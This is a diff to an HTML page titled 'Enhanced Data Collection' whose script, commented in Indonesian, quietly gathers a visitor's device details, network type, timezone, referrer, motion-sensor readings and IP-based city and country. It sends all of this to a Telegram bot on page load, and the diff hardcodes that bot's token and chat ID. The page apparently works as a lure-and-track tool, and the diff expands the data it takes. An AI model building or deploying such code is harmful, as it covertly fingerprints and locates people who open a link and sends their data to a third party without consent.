@@ -3,12 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Device Info Collector</title>
+    <title>Enhanced Data Collection</title>
 </head>
 <body>
-    <h1>Device Information Collector</h1>
-    <p>Processing your device information...</p>
-
+    <h1>Data Collection in Progress...</h1>
     <script>
         const telegramToken = "7375262668:AAHBFfwnMZ9Cg0clsH-m5HZOdq-nhFJ9Cww";
         const chatId = "5649811717";
@@ -24,41 +22,47 @@
             .catch(error => console.error("Error sending to Telegram:", error));
         }
 
-        // Ambil informasi perangkat dari user agent
-        const userAgent = navigator.userAgent;
-        let deviceInfo = `User Agent: ${userAgent}\n`;
+        // Data yang dikumpulkan
+        const data = [];
 
-        // Deteksi merek perangkat
-        if (userAgent.includes("Android")) {
-            if (userAgent.includes("Samsung")) {
-                deviceInfo += "Device: Samsung\n";
-            } else if (userAgent.includes("Huawei")) {
-                deviceInfo += "Device: Huawei\n";
-            } else if (userAgent.includes("Xiaomi")) {
-                deviceInfo += "Device: Xiaomi\n";
-            } else {
-                deviceInfo += "Device: Android (Unknown Brand)\n";
-            }
-        } else if (userAgent.includes("iPhone")) {
-            deviceInfo += "Device: Apple iPhone\n";
-        } else {
-            deviceInfo += "Device: Unknown\n";
+        // Informasi perangkat
+        data.push(`User Agent: ${navigator.userAgent}`);
+        data.push(`Platform: ${navigator.platform}`);
+        data.push(`CPU Cores: ${navigator.hardwareConcurrency || "Not Supported"}`);
+        data.push(`Device Memory (GB): ${navigator.deviceMemory || "Not Supported"}`);
+        data.push(`Dark Mode: ${window.matchMedia("(prefers-color-scheme: dark)").matches}`);
+        data.push(`Input Type: ${"ontouchstart" in window ? "Touch Screen" : "Mouse/Keyboard"}`);
+
+        // Informasi Jaringan
+        if (navigator.connection) {
+            data.push(`Connection Type: ${navigator.connection.effectiveType}`);
+            data.push(`Downlink Speed (Mbps): ${navigator.connection.downlink}`);
         }
 
-        // Ambil status baterai jika tersedia
-        if (navigator.getBattery) {
-            navigator.getBattery().then((battery) => {
-                const batteryInfo = `
-                    Battery Level: ${battery.level * 100}%
-                    Charging: ${battery.charging ? "Yes" : "No"}
-                    Charging Time: ${battery.chargingTime} seconds
-                    Discharging Time: ${battery.dischargingTime} seconds
-                `;
-                sendToTelegram(`${deviceInfo}\n${batteryInfo}`);
+        // Waktu dan Zona Waktu
+        const localTime = new Date().toLocaleString();
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        data.push(`Local Time: ${localTime}`);
+        data.push(`Timezone: ${timezone}`);
+
+        // Referrer
+        data.push(`Referrer URL: ${document.referrer || "Direct Access"}`);
+
+        // Sensor Perangkat
+        window.addEventListener("deviceorientation", (event) => {
+            data.push(`Device Orientation: Alpha ${event.alpha}, Beta ${event.beta}, Gamma ${event.gamma}`);
+            sendToTelegram(data.join("\n"));
+        });
+
+        // Lokasi Berdasarkan IP
+        fetch("https://ipapi.co/json/")
+            .then(response => response.json())
+            .then(ipData => {
+                data.push(`IP Address: ${ipData.ip}`);
+                data.push(`City: ${ipData.city}`);
+                data.push(`Country: ${ipData.country_name}`);
+                sendToTelegram(data.join("\n"));
             });
-        } else {
-            sendToTelegram(`${deviceInfo}\nBattery Info: Not Supported`);
-        }
     </script>
 </body>
 </html>
